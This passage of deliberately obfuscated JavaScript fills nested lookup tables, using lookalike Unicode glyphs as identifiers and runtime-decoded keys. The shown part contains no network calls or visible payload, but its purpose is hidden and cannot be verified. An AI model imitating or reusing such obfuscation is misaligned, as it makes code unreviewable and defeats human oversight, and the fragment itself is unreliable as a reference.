			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[461])] = [ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ⵠⵠᐃΔⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[133])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[461])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[318])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[461])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[482])] = [ⲆΔ.ⵠⵠΔΔⲆ, ⲆΔ.ⵠᐃΔᐃⵠ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ⲆⵠⲆⲆⲆΔⵠ, ⲆΔ.ΔᐃᐃΔⵠⲆⵠ, ⲆΔ.ⵠΔΔⲆⵠⵠⲆ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[298])] = [ⲆΔ.ΔΔΔⲆᐃⵠᐃ, ⲆΔ.ⵠⵠΔΔⲆ, ⲆΔ.ⵠᐃΔᐃⵠ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ⲆⵠⲆⲆⲆΔⵠ, ⲆΔ.ΔᐃᐃΔⵠⲆⵠ, ⲆΔ.ⵠΔΔⲆⵠⵠⲆ, ⲆΔ.ᐃⲆᐃⲆΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[282])] = [ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⵠⵠᐃΔⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[367])] = [ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ᐃⲆᐃⲆΔ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ⵠⲆᐃᐃᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[209])] = [ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ⵠⵠᐃⲆᐃᐃⲆ, ⲆΔ.ⲆⲆⲆⲆⲆⲆΔ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ᐃⲆᐃⲆΔ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ⵠⲆᐃᐃᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[90])] = [ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⲆⲆⵠᐃⲆᐃⵠ, ⲆΔ.ΔⲆΔΔΔᐃΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[501])] = [ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⲆⲆⲆⲆⲆⲆΔ, ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ⵠᐃΔᐃⵠ, ⲆΔ.ⵠⵠΔΔⲆ, ⲆΔ.ΔΔΔⲆᐃⵠᐃ, ⲆΔ.ⵠᐃⵠΔⵠⲆᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[50])] = [ⲆΔ.ⵠⵠᐃΔⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[277])] = [ⲆΔ.ⵠⲆⲆᐃⵠᐃΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[52])] = [ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ΔᐃⵠᐃΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[47])] = [ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[ᐃΔᐃⲆⲆ])] = [ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ⵠⵠΔΔⲆ, ⲆΔ.ⵠᐃΔᐃⵠ, ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ⲆⲆⲆⲆⲆⲆΔ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⵠᐃⵠΔⵠⲆᐃ, ⲆΔ.ᐃᐃΔᐃⵠΔⲆ, ⲆΔ.ⵠⲆⲆᐃⵠᐃΔ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⲆⲆⵠᐃⲆᐃⵠ, ⲆΔ.ΔⲆΔΔΔᐃΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ⲆⵠⲆⲆⲆΔⵠ, ⲆΔ.ΔᐃᐃΔⵠⲆⵠ, ⲆΔ.ⵠΔΔⲆⵠⵠⲆ, ⲆΔ.ᐃⲆᐃⲆΔ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[278])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[14])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[236])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[14])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[276])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[14])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[290])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[ⵠΔΔⵠᐃᐃᐃ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[211])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[ⵠΔΔΔⵠᐃΔⲆⵠ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[557])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[ⲆΔᐃⲆΔᐃΔ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[120])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[ⲆⵠⵠᐃⲆⲆΔ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[125])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[14])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[161])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[ⵠⵠⵠᐃᐃ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[67])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[ⵠΔΔⵠᐃᐃᐃ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[27])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[ⵠᐃⵠΔᐃ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[147])] = [ⲆΔ.ⲆⵠⵠΔᐃΔⵠ, ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ΔᐃⵠᐃΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[13])] = [ⲆΔ.ⲆⵠⵠΔᐃΔⵠ, ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⲆⲆⵠᐃⲆᐃⵠ, ⲆΔ.ΔⲆΔΔΔᐃΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[467])] = [ⲆΔ.ⵠᐃΔᐃⵠ, ⲆΔ.ⵠⵠΔΔⲆ, ⲆΔ.ΔΔΔⲆᐃⵠᐃ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ⲆⵠⵠΔᐃΔⵠ, ⲆΔ.ᐃᐃΔᐃⵠΔⲆ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[405])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[ⵠᐃⲆⵠⲆⵠᐃ])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[146])] = [ⲆΔ.ⲆⵠⵠΔᐃΔⵠ, ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ⵠⵠΔΔⲆ, ⲆΔ.ⵠᐃΔᐃⵠ, ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⵠᐃⵠΔⵠⲆᐃ, ⲆΔ.ᐃᐃΔᐃⵠΔⲆ, ⲆΔ.ⵠⲆⲆᐃⵠᐃΔ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⲆⲆⵠᐃⲆᐃⵠ, ⲆΔ.ΔⲆΔΔΔᐃΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ⲆⵠⲆⲆⲆΔⵠ, ⲆΔ.ΔᐃᐃΔⵠⲆⵠ, ⲆΔ.ⵠΔΔⲆⵠⵠⲆ, ⲆΔ.ᐃⲆᐃⲆΔ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[418])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[146])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[202])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[146])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[477])] = [ⲆΔ.ⲆⵠⵠΔᐃΔⵠ, ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ΔΔΔⲆᐃⵠᐃ, ⲆΔ.ⵠⵠΔΔⲆ, ⲆΔ.ⵠᐃΔᐃⵠ, ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ⲆⲆⲆⲆⲆⲆΔ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⵠᐃⵠΔⵠⲆᐃ, ⲆΔ.ᐃᐃΔᐃⵠΔⲆ, ⲆΔ.ⵠⲆⲆᐃⵠᐃΔ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⲆⲆⵠᐃⲆᐃⵠ, ⲆΔ.ΔⲆΔΔΔᐃΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ⲆⵠⲆⲆⲆΔⵠ, ⲆΔ.ΔᐃᐃΔⵠⲆⵠ, ⲆΔ.ⵠΔΔⲆⵠⵠⲆ, ⲆΔ.ᐃⲆᐃⲆΔ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[228])] = [ⲆΔ.ⲆⵠⵠⵠⲆⲆⵠ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⲆΔⲆⲆⵠᐃᐃ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[269])] = [ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ⲆⵠⵠⵠⲆⲆⵠ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⵠⲆⲆᐃⵠᐃΔ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ᐃⲆᐃⲆΔ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[195])] = [ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ⲆⲆⲆⲆⲆⲆΔ, ⲆΔ.ⲆⵠⵠⵠⲆⲆⵠ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⵠⲆⲆᐃⵠᐃΔ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ᐃⲆᐃⲆΔ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[376])] = [ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ⲆⵠⵠⵠⲆⲆⵠ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⲆΔⲆⲆⵠᐃᐃ, ⲆΔ.ᐃⲆⲆΔᐃΔᐃ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⲆⲆⵠᐃⲆᐃⵠ, ⲆΔ.ΔⲆΔΔΔᐃΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[411])] = [ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ⵠⵠΔΔⲆ, ⲆΔ.ⵠᐃΔᐃⵠ, ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ⲆⲆⲆⲆⲆⲆΔ, ⲆΔ.ⲆⵠⵠⵠⲆⲆⵠ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⵠᐃⵠΔⵠⲆᐃ, ⲆΔ.ᐃⲆⲆΔᐃΔᐃ, ⲆΔ.ᐃᐃΔᐃⵠΔⲆ, ⲆΔ.ⵠⲆⲆᐃⵠᐃΔ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⲆⲆⵠᐃⲆᐃⵠ, ⲆΔ.ΔⲆΔΔΔᐃΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ⲆⵠⲆⲆⲆΔⵠ, ⲆΔ.ΔᐃᐃΔⵠⲆⵠ, ⲆΔ.ⵠΔΔⲆⵠⵠⲆ, ⲆΔ.ᐃⲆᐃⲆΔ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[141])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[411])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[521])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[411])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[89])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[411])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[199])] = [ⲆΔ.ΔⲆᐃⵠΔ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ᐃⲆᐃⲆΔ, ⲆΔ.ⵠΔΔⲆⵠⵠⲆ, ⲆΔ.ΔᐃᐃΔⵠⲆⵠ, ⲆΔ.ⲆⵠⲆⲆⲆΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ΔⲆΔΔΔᐃΔ, ⲆΔ.ⲆⲆⵠᐃⲆᐃⵠ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⵠⲆⲆᐃⵠᐃΔ, ⲆΔ.ᐃᐃΔᐃⵠΔⲆ, ⲆΔ.ᐃⲆⲆΔᐃΔᐃ, ⲆΔ.ⵠᐃⵠΔⵠⲆᐃ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⲆⵠⵠⵠⲆⲆⵠ, ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ⵠᐃΔᐃⵠ, ⲆΔ.ⵠⵠΔΔⲆ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ⲆⵠⵠΔᐃΔⵠ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[494])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[199])];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[135])] = [ⲆΔ.ⲆΔⲆⲆⵠᐃᐃ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⲆⵠⵠⵠⲆⲆⵠ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ⲆⵠⵠΔᐃΔⵠ, ⲆΔ.ᐃⲆⲆΔᐃΔᐃ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[506])] = [ⲆΔ.ⲆⵠⵠΔᐃΔⵠ, ⲆΔ.ⵠΔⲆᐃⲆ, ⲆΔ.ᐃᐃⵠΔΔ, ⲆΔ.ΔΔΔⲆᐃⵠᐃ, ⲆΔ.ⵠⵠΔΔⲆ, ⲆΔ.ⵠᐃΔᐃⵠ, ⲆΔ.ⲆⵠΔᐃᐃ, ⲆΔ.ⲆⲆⲆⲆⲆⲆΔ, ⲆΔ.ⲆⵠⵠⵠⲆⲆⵠ, ⲆΔ.ΔᐃⲆⲆᐃ, ⲆΔ.ⵠᐃⵠΔⵠⲆᐃ, ⲆΔ.ᐃᐃΔᐃⵠΔⲆ, ⲆΔ.ⵠⲆⲆᐃⵠᐃΔ, ⲆΔ.ᐃΔⲆⵠΔ, ⲆΔ.ⲆⲆⵠᐃⲆᐃⵠ, ⲆΔ.ΔⲆΔΔΔᐃΔ, ⲆΔ.ⵠⵠᐃΔⵠ, ⲆΔ.ⵠⲆᐃᐃΔ, ⲆΔ.ⲆⵠⲆⲆⲆΔⵠ, ⲆΔ.ΔᐃᐃΔⵠⲆⵠ, ⲆΔ.ⵠΔΔⲆⵠⵠⲆ, ⲆΔ.ᐃⲆᐃⲆΔ, ⲆΔ.ΔᐃⵠᐃΔ, ⲆΔ.ΔⲆᐃⵠΔ];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[121])] = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][Ⲇ.ΔⲆΔ][ⲆΔⵠΔ(ⵠ[199])];
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[461])] = ⲆΔ.ⵠΔᐃⲆⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[133])] = ⲆΔ.ᐃⵠⵠΔᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[318])] = ⲆΔ.ⲆΔⵠⵠΔᐃᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[482])] = ⲆΔ.ᐃⵠⲆⵠᐃⲆᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[298])] = ⲆΔ.ΔᐃᐃΔⲆΔⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[282])] = ⲆΔ.ⵠᐃⵠᐃᐃⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[367])] = ⲆΔ.ⲆⲆⵠⵠⲆΔⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[209])] = ⲆΔ.ᐃΔⲆᐃᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[90])] = ⲆΔ.ⵠⵠⲆⵠⲆΔⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[27])] = ⲆΔ.ΔΔⲆᐃΔⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[276])] = ⲆΔ.ⲆᐃᐃⲆΔⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[67])] = ⲆΔ.ΔᐃⲆᐃⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[501])] = ⲆΔ.ᐃⵠᐃⵠⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[50])] = ⲆΔ.ⲆⵠᐃⲆⵠⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[277])] = ⲆΔ.ᐃᐃⲆⲆᐃⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[52])] = ⲆΔ.ⲆⲆⲆᐃⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[278])] = ⲆΔ.ⵠⵠᐃᐃᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[236])] = ⲆΔ.ⵠΔⵠΔᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[47])] = ⲆΔ.ⵠΔⲆΔΔⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[290])] = ⲆΔ.ⵠᐃⵠΔᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[14])] = ⲆΔ.ⲆⲆⵠΔⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[211])] = ⲆΔ.ᐃⵠⲆⲆⲆᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[557])] = ⲆΔ.ΔᐃⵠΔᐃΔᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[120])] = ⲆΔ.ⲆΔᐃΔᐃⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[125])] = ⲆΔ.ᐃⲆⵠΔⵠΔᐃ;
			ⵠⲆ[Ⲇ.ⲆΔᐃΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠΔ(ⵠ[161])] = ⲆΔ.ⲆᐃᐃⲆⲆⲆⲆ;
